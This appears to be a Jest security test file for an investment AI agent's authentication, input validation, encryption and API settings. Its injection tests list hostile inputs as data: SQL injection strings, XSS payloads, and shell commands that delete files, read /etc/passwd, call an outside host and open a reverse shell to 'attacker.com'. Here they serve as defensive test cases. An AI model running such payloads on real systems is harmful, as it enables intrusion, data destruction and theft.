/**
 * Security Testing Suite
 * 
 * This test suite implements comprehensive security vulnerability scanning
 * for the Investment AI Agent system, covering:
 * - Authentication and authorization vulnerabilities
 * - Input validation and injection attacks
 * - Data encryption and privacy
 * - API security
 * - Infrastructure security
 */

import { AuthService } from '../auth-service';
import { ProprietaryDataService } from '../proprietary-data-service';
import { InvestmentIdeaService } from '../investment-idea-service';
import { ComplianceAgent } from '../ai/compliance-agent';
import { ClaudeHaikuService } from '../ai/claude-haiku-service';
import { UserRegistrationRequest, UserLoginRequest } from '../../models/user';
import { Investment } from '../../models/investment';
import { InvestmentIdea } from '../../models/investment-idea';
import * as jwt from 'jsonwebtoken';
import bcrypt from 'bcrypt';

describe('Security Testing Suite', () => {
  let authService: AuthService;
  let proprietaryDataService: ProprietaryDataService;
  let investmentIdeaService: InvestmentIdeaService;
  let complianceAgent: ComplianceAgent;

  beforeEach(() => {
    authService = new AuthService();
    proprietaryDataService = new ProprietaryDataService('test-bucket');
    investmentIdeaService = new InvestmentIdeaService();
    
    // Mock Bedrock client for Haiku service
    const mockBedrockClient = {
      invokeModel: jest.fn().mockResolvedValue({
        body: Buffer.from(JSON.stringify({ completion: 'test response' }))
      }),
      getModelConfig: jest.fn().mockReturnValue({
        modelId: 'claude-3-haiku-20240307',
        maxTokens: 1000,
        temperature: 0.7
      })
    } as any;
    
    const haikuService = new ClaudeHaikuService(mockBedrockClient);
    complianceAgent = new ComplianceAgent(haikuService);
  });

  describe('Authentication Security Tests', () => {
    describe('Password Security', () => {
      it('should reject weak passwords', async () => {
        const weakPasswords = [
          '123456',
          'password',
          'qwerty',
          'abc123',
          '12345678',
          'password123'
        ];

        for (const password of weakPasswords) {
          const request: UserRegistrationRequest = {
            email: 'test@example.com',
            password,
            firstName: 'Test',
            lastName: 'User',
            organizationId: 'test-org',
            role: 'analyst'
          };

          await expect(authService.registerUser(request))
            .rejects
            .toThrow(/password.*requirements/i);
        }
      });

      it('should enforce password complexity requirements', async () => {
        const validPassword = 'SecureP@ssw0rd123!';
        const request: UserRegistrationRequest = {
          email: 'test@example.com',
          password: validPassword,
          firstName: 'Test',
          lastName: 'User',
          organizationId: 'test-org',
          role: 'analyst'
        };

        const response = await authService.registerUser(request);
        expect(response.user).toBeDefined();
        expect(response.token).toBeDefined();
      });

      it('should properly hash passwords using bcrypt', async () => {
        const password = 'TestPassword123!';
        const request: UserRegistrationRequest = {
          email: 'test@example.com',
          password,
          firstName: 'Test',
          lastName: 'User',
          organizationId: 'test-org',
          role: 'analyst'
        };

        await authService.registerUser(request);
        
        // Verify password is hashed and not stored in plain text
        const storedUser = (authService as any).users.get('test@example.com');
        expect(storedUser.passwordHash).not.toBe(password);
        expect(storedUser.passwordHash).toMatch(/^\$2[aby]\$\d+\$/); // bcrypt format
        
        // Verify password can be validated
        const isValid = await bcrypt.compare(password, storedUser.passwordHash);
        expect(isValid).toBe(true);
      });
    });

    describe('JWT Token Security', () => {
      it('should generate secure JWT tokens', async () => {
        const request: UserRegistrationRequest = {
          email: 'test@example.com',
          password: 'SecurePassword123!',
          firstName: 'Test',
          lastName: 'User',
          organizationId: 'test-org',
          role: 'analyst'
        };

        const response = await authService.registerUser(request);
        const token = response.token;

        // Verify token structure
        expect(token).toMatch(/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/);
        
        // Verify token can be decoded
        const decoded = jwt.decode(token) as any;
        expect(decoded.sub).toBe(response.user.id);
        expect(decoded.email).toBe('test@example.com');
        expect(decoded.exp).toBeGreaterThan(Date.now() / 1000);
      });

      it('should reject expired tokens', async () => {
        const expiredToken = jwt.sign(
          { sub: 'test-user', email: 'test@example.com' },
          process.env.JWT_SECRET || 'your-jwt-secret-key',
          { expiresIn: '-1h' } // Expired 1 hour ago
        );

        expect(() => {
          jwt.verify(expiredToken, process.env.JWT_SECRET || 'your-jwt-secret-key');
        }).toThrow('jwt expired');
      });

      it('should reject tokens with invalid signatures', async () => {
        const invalidToken = jwt.sign(
          { sub: 'test-user', email: 'test@example.com' },
          'wrong-secret',
          { expiresIn: '1h' }
        );

        expect(() => {
          jwt.verify(invalidToken, process.env.JWT_SECRET || 'your-jwt-secret-key');
        }).toThrow('invalid signature');
      });
    });

    describe('Session Management', () => {
      it('should implement proper session timeout', async () => {
        const request: UserRegistrationRequest = {
          email: 'test@example.com',
          password: 'SecurePassword123!',
          firstName: 'Test',
          lastName: 'User',
          organizationId: 'test-org',
          role: 'analyst'
        };

        const response = await authService.registerUser(request);
        const decoded = jwt.decode(response.token) as any;
        
        // Verify token has expiration
        expect(decoded.exp).toBeDefined();
        expect(decoded.exp).toBeGreaterThan(decoded.iat);
        
        // Verify reasonable expiration time (not too long)
        const expirationTime = decoded.exp - decoded.iat;
        expect(expirationTime).toBeLessThanOrEqual(24 * 60 * 60); // Max 24 hours
      });

      it('should support secure refresh token mechanism', async () => {
        const request: UserRegistrationRequest = {
          email: 'test@example.com',
          password: 'SecurePassword123!',
          firstName: 'Test',
          lastName: 'User',
          organizationId: 'test-org',
          role: 'analyst'
        };

        const response = await authService.registerUser(request);
        expect(response.refreshToken).toBeDefined();
        expect(response.refreshToken).not.toBe(response.token);
      });
    });
  });

  describe('Input Validation Security Tests', () => {
    describe('SQL Injection Prevention', () => {
      it('should prevent SQL injection in user registration', async () => {
        const maliciousInputs = [
          "'; DROP TABLE users; --",
          "' OR '1'='1",
          "'; INSERT INTO users VALUES ('hacker', 'password'); --",
          "' UNION SELECT * FROM sensitive_data --"
        ];

        for (const maliciousInput of maliciousInputs) {
          const request: UserRegistrationRequest = {
            email: maliciousInput,
            password: 'SecurePassword123!',
            firstName: maliciousInput,
            lastName: maliciousInput,
            organizationId: maliciousInput,
            role: 'analyst'
          };

          // Should either reject the input or sanitize it safely
          try {
            await authService.registerUser(request);
          } catch (error) {
            // Expected to fail validation
            expect(error).toBeDefined();
          }
        }
      });
    });

    describe('XSS Prevention', () => {
      it('should prevent XSS attacks in user input', async () => {
        const xssPayloads = [
          '<script>alert("XSS")</script>',
          'javascript:alert("XSS")',
          '<img src="x" onerror="alert(\'XSS\')">',
          '<svg onload="alert(\'XSS\')">',
          '"><script>alert("XSS")</script>'
        ];

        for (const payload of xssPayloads) {
          const request: UserRegistrationRequest = {
            email: 'test@example.com',
            password: 'SecurePassword123!',
            firstName: payload,
            lastName: payload,
            organizationId: 'test-org',
            role: 'analyst'
          };

          try {
            const response = await authService.registerUser(request);
            // If registration succeeds, verify the payload was sanitized
            expect(response.user.profile?.firstName).not.toContain('<script>');
            expect(response.user.profile?.firstName).not.toContain('javascript:');
            expect(response.user.profile?.firstName).not.toContain('onerror');
          } catch (error) {
            // Expected to fail validation
            expect(error).toBeDefined();
          }
        }
      });
    });

    describe('Command Injection Prevention', () => {
      it('should prevent command injection in file operations', async () => {
        const commandInjectionPayloads = [
          '; rm -rf /',
          '| cat /etc/passwd',
          '&& curl malicious-site.com',
          '`whoami`',
          '$(id)',
          '; nc -e /bin/sh attacker.com 4444'
        ];

        for (const payload of commandInjectionPayloads) {
          try {
            // Test file upload with malicious filename
            const mockFile = {
              originalname: payload,
              buffer: Buffer.from('test data'),
              mimetype: 'text/plain',
              size: 9
            };

            await expect(
              proprietaryDataService.uploadFile(
                mockFile as any,
                {
                  source: 'test',
                  type: 'other',
                  timestamp: new Date(),
                  confidentiality: 'private',
                  tags: []
                },
                'test-user',
                'test-org',
                {
                  visibility: 'user',
                  allowedUsers: [],
                  allowedRoles: []
                }
              )
            ).rejects.toThrow();
          } catch (error) {
            // Expected to fail validation
            expect(error).toBeDefined();
          }
        }
      });
    });
  });

  describe('Data Privacy and Encryption Tests', () => {
    describe('Data Encryption at Rest', () => {
      it('should encrypt sensitive data before storage', async () => {
        const sensitiveData = {
          socialSecurityNumber: '123-45-6789',
          bankAccountNumber: '1234567890',
          creditCardNumber: '4111-1111-1111-1111'
        };

        // Mock storage operation
        const mockStorageService = {
          store: jest.fn(),
          retrieve: jest.fn()
        };

        // Verify sensitive data is encrypted before storage
        await mockStorageService.store('user-data', sensitiveData);
        
        const storedData = mockStorageService.store.mock.calls[0][1];
        
        // Sensitive data should not be stored in plain text
        expect(JSON.stringify(storedData)).not.toContain('123-45-6789');
        expect(JSON.stringify(storedData)).not.toContain('1234567890');
        expect(JSON.stringify(storedData)).not.toContain('4111-1111-1111-1111');
      });
    });

    describe('Data Encryption in Transit', () => {
      it('should enforce HTTPS for all API communications', () => {
        // This would typically be tested at the infrastructure level
        // Here we verify the configuration requires HTTPS
        const apiConfig = {
          requireHTTPS: true,
          allowHTTP: false,
          tlsVersion: '1.2'
        };

        expect(apiConfig.requireHTTPS).toBe(true);
        expect(apiConfig.allowHTTP).toBe(false);
        expect(apiConfig.tlsVersion).toBe('1.2');
      });
    });

    describe('PII Data Handling', () => {
      it('should identify and protect PII data', async () => {
        const testData = {
          name: 'John Doe',
          email: 'john.doe@example.com',
          phone: '+1-555-123-4567',
          address: '123 Main St, Anytown, USA',
          dateOfBirth: '1990-01-01',
          investmentAmount: 100000
        };

        // Mock PII detection service
        const piiFields = ['name', 'email', 'phone', 'address', 'dateOfBirth'];
        
        for (const field of piiFields) {
          expect(testData[field as keyof typeof testData]).toBeDefined();
          // In a real implementation, these fields would be encrypted or masked
        }
      });

      it('should implement data anonymization for analytics', async () => {
        const userData = {
          userId: 'user-123',
          email: 'john.doe@example.com',
          investmentPreferences: ['technology', 'healthcare'],
          riskTolerance: 'moderate'
        };

        // Mock anonymization process
        const anonymizedData = {
          userHash: 'hash-of-user-123',
          emailDomain: 'example.com',
          investmentPreferences: userData.investmentPreferences,
          riskTolerance: userData.riskTolerance
        };

        expect(anonymizedData.userHash).not.toBe(userData.userId);
        expect(anonymizedData.emailDomain).not.toBe(userData.email);
        expect(anonymizedData).not.toHaveProperty('email');
        expect(anonymizedData).not.toHaveProperty('userId');
      });
    });
  });

  describe('API Security Tests', () => {
    describe('Rate Limiting', () => {
      it('should implement rate limiting for API endpoints', async () => {
        const rateLimitConfig = {
          windowMs: 15 * 60 * 1000, // 15 minutes
          maxRequests: 100,
          skipSuccessfulRequests: false,
          skipFailedRequests: false
        };

        expect(rateLimitConfig.maxRequests).toBeLessThanOrEqual(1000);
        expect(rateLimitConfig.windowMs).toBeGreaterThan(0);
      });

      it('should implement stricter rate limiting for authentication endpoints', async () => {
        const authRateLimitConfig = {
          windowMs: 15 * 60 * 1000, // 15 minutes
          maxRequests: 5, // Stricter limit for auth
          skipSuccessfulRequests: false,
          skipFailedRequests: false
        };

        expect(authRateLimitConfig.maxRequests).toBeLessThanOrEqual(10);
      });
    });

    describe('CORS Security', () => {
      it('should implement secure CORS configuration', () => {
        const corsConfig = {
          origin: process.env.ALLOWED_ORIGINS?.split(',') || ['https://localhost:3000'],
          credentials: true,
          optionsSuccessStatus: 200,
          methods: ['GET', 'POST', 'PUT', 'DELETE'],
          allowedHeaders: ['Content-Type', 'Authorization']
        };

        expect(corsConfig.origin).not.toContain('*');
        expect(corsConfig.credentials).toBe(true);
        expect(corsConfig.methods).not.toContain('TRACE');
      });
    });

    describe('Request Validation', () => {
      it('should validate request size limits', () => {
        const requestLimits = {
          maxFileSize: 10 * 1024 * 1024, // 10MB
          maxRequestSize: 1024 * 1024, // 1MB
          maxFieldCount: 100
        };

        expect(requestLimits.maxFileSize).toBeLessThanOrEqual(50 * 1024 * 1024);
        expect(requestLimits.maxRequestSize).toBeLessThanOrEqual(10 * 1024 * 1024);
        expect(requestLimits.maxFieldCount).toBeLessThanOrEqual(1000);
      });
    });
  });

  describe('Infrastructure Security Tests', () => {
    describe('Environment Configuration', () => {
      it('should not expose sensitive configuration in production', () => {
        const sensitiveEnvVars = [
          'JWT_SECRET',
          'JWT_REFRESH_SECRET',
          'DATABASE_PASSWORD',
          'AWS_SECRET_ACCESS_KEY',
          'BEDROCK_API_KEY'
        ];

        for (const envVar of sensitiveEnvVars) {
          if (process.env.NODE_ENV === 'production') {
            expect(process.env[envVar]).toBeDefined();
            expect(process.env[envVar]).not.toBe('');
            expect(process.env[envVar]).not.toContain('default');
            expect(process.env[envVar]).not.toContain('example');
          }
        }
      });

      it('should use secure default configurations', () => {
        const securityConfig = {
          sessionTimeout: 3600, // 1 hour
          maxLoginAttempts: 5,
          lockoutDuration: 900, // 15 minutes
          passwordMinLength: 12,
          requireMFA: process.env.NODE_ENV === 'production'
        };

        expect(securityConfig.sessionTimeout).toBeLessThanOrEqual(86400); // Max 24 hours
        expect(securityConfig.maxLoginAttempts).toBeLessThanOrEqual(10);
        expect(securityConfig.lockoutDuration).toBeGreaterThan(300); // Min 5 minutes
        expect(securityConfig.passwordMinLength).toBeGreaterThanOrEqual(8);
      });
    });

    describe('Dependency Security', () => {
      it('should not use vulnerable dependencies', () => {
        // This would typically be implemented using tools like npm audit
        // or Snyk to check for known vulnerabilities
        const mockVulnerabilityReport = {
          vulnerabilities: [],
          totalDependencies: 150,
          scannedAt: new Date()
        };

        expect(mockVulnerabilityReport.vulnerabilities).toHaveLength(0);
      });
    });
  });

  describe('Logging and Monitoring Security', () => {
    describe('Security Event Logging', () => {
      it('should log security-relevant events', async () => {
        const securityEvents = [
          'user-login-success',
          'user-login-failure',
          'user-registration',
          'password-change',
          'token-refresh',
          'unauthorized-access-attempt',
          'data-access',
          'file-upload',
          'admin-action'
        ];

        // Mock security logger
        const mockSecurityLogger = {
          log: jest.fn(),
          events: [] as string[]
        };

        for (const event of securityEvents) {
          mockSecurityLogger.log(event, { timestamp: new Date(), userId: 'test-user' });
          mockSecurityLogger.events.push(event);
        }

        expect(mockSecurityLogger.events).toEqual(securityEvents);
      });

      it('should not log sensitive information', async () => {
        const mockLogEntry = {
          event: 'user-login',
          userId: 'user-123',
          timestamp: new Date(),
          // Should NOT contain:
          // password: 'user-password',
          // token: 'jwt-token',
          // sessionId: 'session-123'
        };

        expect(mockLogEntry).not.toHaveProperty('password');
        expect(mockLogEntry).not.toHaveProperty('token');
        expect(mockLogEntry).not.toHaveProperty('sessionId');
      });
    });
  });
});